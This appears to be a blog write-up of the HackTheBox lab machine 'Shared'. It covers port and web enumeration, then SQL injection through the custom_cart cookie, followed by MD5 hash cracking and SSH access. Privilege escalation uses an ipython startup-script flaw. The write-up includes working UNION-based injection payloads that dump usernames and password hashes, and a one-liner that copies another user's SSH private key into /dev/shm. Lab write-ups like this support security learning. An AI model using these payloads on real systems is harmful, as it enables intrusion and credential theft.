---
title: "Shared"
date: 2023-06-24T23:52:47+02:00
tags: ["procmon.sh","web","linux","openssl","SQL Injection","hash","burpsuite","cookies"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: /HTB/Shared.png
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: ""
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---


## Room Information

- Room name: Shared
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/Shared

![Untitled](/HTB/Shared.png)

## Tools Used

- Nmap
- Gobuster
- hash-identifier
- Nikto
- whatweb
- openssl
- burpsuite
- ps

## Port Scanning

In the port scan we can see multiple open ports:

Using this command of nmap

```bash
nmap -p- -sC -sV --min-rate 5000 --open -sS -n -Pn -oN escaneo 10.10.11.172
```
![Untitled](/HTB/escaneo-shared.png)

## Enumeration

If we first visit the website we can't see anything because there's visrtual hosting. So we need to put the ip  and the name into 'etc/hosts'.
And now it works correctly:

![Untitled](/HTB/ping-shared.png)

What I usually do at the beginning is take a look of the page and see if there are something curious, in this case 
i see that there's a subdomain 'checkout.shared.htb' when i go to de checkout panel, so let's put it on 'etc/hosts' too.

As always, let's take a look of the information on the web, with:

```bash
whatweb 10.10.11.172
```
![Untitled](/HTB/prestashop-shared.png)

We can see that the web runs with the prestashop system, which at the moment isn't very relevant.

Also we can see this using wappalyzer extension for firefox

![Untitled](/HTB/wappalyzer-shared.png)

So let's run gobuster and analyze subdomains first:

```bash
gobuster vhost -u http://shared.htb/ -w subdomains-top1mil-20000.txt -t 20
```
![Untitled](/HTB/gobuster-shared.png)


Then, let's try first to get some info of port 443 (openssl):

```bash
openssl s_client -connect 10.10.11.172:443
```
![Untitled](/HTB/openssl-shared.png)

Sometimes this can give us some relevant information like, e-mails...

Other thing that we can do is inspect https certificate, but in this case is not worth.

To continue i inspect the page and search the cookies, and i've seen one called 
custom_cart and it's quite interesting

![Untitled](/HTB/cookies-shared.png)

Now, go to burpsuite:

![Untitled](/HTB/burpsuite-shared.png)

Now we will focus on the cookie mentioned above because if we convert it from url encode
 we can see that it stays something like this: 'custom_cart={"53GG2EF8":"1"}'

So I start doing tests to see if SQL injection could be applied, playing with the cookie and the response of Not Found, some commands I use:
```ruby
custom_cart={"'":"1"}
custom_cart={"' or 1=1-- -'":"1"}
custom_cart={"' or 1=2-- -'":"1"}
custom_cart={"order by 100":"1"}
custom_cart={"'order by 5'":"1"}
custom_cart={"'or sleep(5)-- -'":"1"}  -> disappears Not Found
custom_cart={"'and sleep(5)-- -'":"1"}
custom_cart={"'union select 1-- -'":"1"} -> here I supouse that there is one column
custom_cart={"'union select 1,2,3-- -'":"1"} -> here in the column of Not Found appears '2', so interesting 
custom_cart={"'union select 1,'prueba',3-- -'":"1"} -> here, definitely is posible a SQL injecton, becaus in Not Found column shows 'prueba'
custom_cart={"'union select 1,database(),3-- -'":"1"} -> with database() we can know the data base name
custom_cart={"'union select 1,group_concat(schema_name),3 from information_schema.schemata-- -'":"1"} -> with this we can know all data base names
custom_cart={"'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='checkout'-- -'":"1"} -> with that we can know the tables of the data base checkout
custom_cart={"'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='checkout' and table_name='user'-- -'":"1"} -> with this we can know columns of table User
custom_cart={"'union select 1,group_concat(username,0x3a,password),3 form user-- -'":"1"} -> 0x3a = : 
```

![Untitled](/HTB/burpsuitePasw-shared.png)

Now with the hash obtained I'm going to pass it through 'hash-identifier', and it shows me that is encoded in md5.

![Untitled](/HTB/hashIdentifier-shared.png)

Now I'm going to try to decipher this password, it can be done in many ways (with a dictionary, with the GPU with hashcat ...), but as this should be simple let's look for an online decryptor.

![Untitled](/HTB/psw-shared.png)

Now as we already have the password, let's try to connect to the machin by ssh with user james_mason

![Untitled](/HTB/pwn-shared.png)

And finally we have access to the machineee !!!!

## Treatment of tty

```bash
export TERM=xterm 

```


## Privilege escalation

We are logged like james-mason and the flags isn't there. I discovered that the flag is into other user called  'dan_smith'

![Untitled](/HTB/ep1-shared.png)

Now let’s elevate privilege

we can see that we are in developer group

![Untitled](/HTB/ep1-shared.png)

So let's find files of this group

```bash
find / -group developer 2>/dev/null
```
I find the empty directory /opt/scripts_review and we have write and read permissions. There may be chrom tasks 
that point to this device to create something temporal, maybe. So lets create a procmon.sh on /dev/shm (where temporary data is stored).

```bash
cd /dev/shm
touch procmon.sh 
chmod +x procmon.sh
nano procmon.sh 
```
Inside procmon.sh we can put:

```bash
 #!/bin/bash

old_process=$(ps -eo user,command | awk '!/procmon|kworker/ {print}')

while true; do
        new_process=$(ps -eo user,command | awk '!/procmon|kworker/ {print}')
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>]" | grep -vE "procmon|awk|kworker"
        old_process=$new_process
done
```
This script displays new processes that are started in the system, excluding some specific processes, and does so in a continuous loop. 
It is useful for monitoring the execution of new processes in real time. 

![Untitled](/HTB/procmon-resultado-shared.png)

Then, I went to look for information about what ipython is in google, and I found that on its github page there was a column that 
put security and showed that it had an unfixed CVE (very curious). So I decided to follow the steps they mentioned to 
be able to execute commands like dan_smith.

The page -> [here](https://github.com/ipython/ipython/security/advisories/GHSA-pq7m-3gw7-gq5x).
  
![Untitled](/HTB/ipython-cve-shared.png)

In the end according to what I put on the page I have a script such as this:

```bash
mkdir -m 777 profile_default && mkdir -m 777 profile_default/startup && echo 'import os; os.system("cat ~/.ssh/id_rsa > /dev/shm/key")' > profile_default/startup/foo.py
```
This allows us to execute commands as if we were dan_smith. Then, we will copy your ssh key to a directory that 
we have full access, as is the case with /dev/shm.


We can wait for second in second, with this command:

```bash
watch -n 1 ls -l /dev/shm
```
Finally, I managed to send the dan_smith id_rsa to /dev/shm/, so all I had to do is copy it to my main system and connect via ssh.

![Untitled](/HTB/final-shared.png)

So the machine is finished!!!

## Lesson Learned

- What insights did you gain from the room?
    
    I acquired knowledge on the functioning of a cron job and discovered ways to exploit it for potential machine compromise.
    
- Were there any novel tools or techniques employed?
    
    Notably, the utilization of nikto and various reverse shells were introduced.

**Thank you for reading, and happy hacking! 😄**
